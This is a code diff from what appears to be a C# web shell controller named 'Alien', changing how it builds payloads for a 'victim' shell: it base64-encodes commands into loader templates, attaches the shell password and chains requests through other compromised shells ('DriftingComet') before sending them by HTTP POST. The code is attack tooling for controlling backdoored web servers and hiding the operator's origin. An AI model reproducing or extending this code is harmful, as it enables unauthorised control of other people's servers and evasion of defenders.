@@ -947,7 +947,7 @@ namespace Alien
 
             if (m_victim.ShellPayloadType == enPayloadType.ECDH)
             {
-                szPayload = clsTamper.fnMergePayloadToOne(szPayload, asParams, m_victim.ShellLanguage);
+                szPayload = clsTamper.fnMergePayloadToOne(m_victim.m_ShellConfig, szPayload, asParams, m_victim.ShellLanguage);
             }
             else
             {
@@ -962,7 +962,7 @@ namespace Alien
                 }
 
                 if (config.bEHEnable)
-                    szPayload = clsTamper.fnMergePayloadToOne(szPayload, asParams, config.language);
+                    szPayload = clsTamper.fnMergePayloadToOne(m_victim.m_ShellConfig, szPayload, asParams, config.language);
 
                 string szPayloadMethod = m_victim.m_ShellConfig.szMethod;
 
@@ -972,10 +972,11 @@ namespace Alien
                 if (string.IsNullOrEmpty(szLoader))
                     throw new Exception("Cannot find any loader for: " + Enum.GetName(typeof(enLanguage), m_victim.ShellLanguage));
 
-                szLoader = Uri.EscapeDataString(szLoader)?
-                    .Replace("%5BPATTERN%5D", Uri.EscapeDataString(clsEzData.fnszStre2b64(szPayload)))
-                    .Replace("%5BENCODING%5D", Uri.EscapeDataString(m_victim.ShellEncoding))
-                    .Replace(" ", "%20");
+                szLoader = szLoader
+                    .Replace("[PATTERN]", clsEzData.fnszStre2b64(szPayload))
+                    .Replace("[ENCODING]", m_victim.ShellEncoding);
+
+                szLoader = Uri.EscapeDataString(szLoader);
 
                 szPayload = (config.bEHEnable ? string.Empty : $"{m_victim.ShellPassword}=") + szLoader + (config.bEHEnable ? string.Empty : $"&{szParams}");
                 if (config.bEHEnable)
@@ -986,13 +987,20 @@ namespace Alien
             if (m_victim.m_ShellConfig.lsCometShellID.Count > 0)
             {
                 var configs = m_victim.m_ShellConfig.lsCometShellID.Select(x => m_sqlConn.fnGetShellConfig(x)).ToList();
-                var result = await fnDriftingComet(configs, Uri.UnescapeDataString(szPayload));
+                configs.Reverse();
 
-                string[] s = result.szComet.Split('=');
-                szPayload = string.Join("=", s[1..]);
-                szPayload = Uri.EscapeDataString(szPayload);
+                var result = await fnDriftingComet(configs, szPayload);
 
-                return await fnHttpPOST(result.config, $"{s[0]}={szPayload}", szSplitter);
+                int idxFirstEq = result.szComet.IndexOf('=');
+                if (idxFirstEq == -1)
+                    throw new Exception("Invalid comet payload format.");
+
+                string szPass = result.szComet.Substring(0, idxFirstEq);
+                string szRealPayload = result.szComet.Substring(idxFirstEq + 1);
+
+                szRealPayload = Uri.EscapeDataString(szRealPayload);
+
+                return await fnHttpPOST(result.config, $"{szPass}={szRealPayload}", szSplitter);
             }
 
             return await fnHttpPOST(new stShellConfig(), szPayload, szSplitter);
@@ -1097,16 +1105,22 @@ namespace Alien
                     if (string.IsNullOrEmpty(szCurrentTemplate))
                         throw new Exception("Comet payload is null or empty");
 
+                    string szNextUrl = i == 0 ? m_victim.ShellURL : lsConfig[i - 1].szUrl;
+
                     string szMergedComet = clsTamper.fnMergePayloadToOne(
+                        config,
                         szCurrentTemplate,
                         new string[] {
-                            clsEzData.fnszStre2b64(i == 0 ? m_victim.ShellURL : lsConfig[i-1].szUrl),
+                            clsEzData.fnszStre2b64(szNextUrl),
                             clsEzData.fnszStre2b64(szCurrentPayload)
                         },
                         config.language
                     );
 
-                    string szCurrentLayer = m_dicDecodeFunc[config.language](config.szMethod).Replace("[PATTERN]", clsEzData.fnszStre2b64(szMergedComet));
+                    string szCurrentLayer = m_dicDecodeFunc[config.language](config.szMethod)
+                        .Replace("[PATTERN]", clsEzData.fnszStre2b64(szMergedComet))
+                        .Replace("[ENCODING]", config.szEncoding);
+
                     szCurrentPayload = $"{szPassword}={szCurrentLayer}";
                 }
 
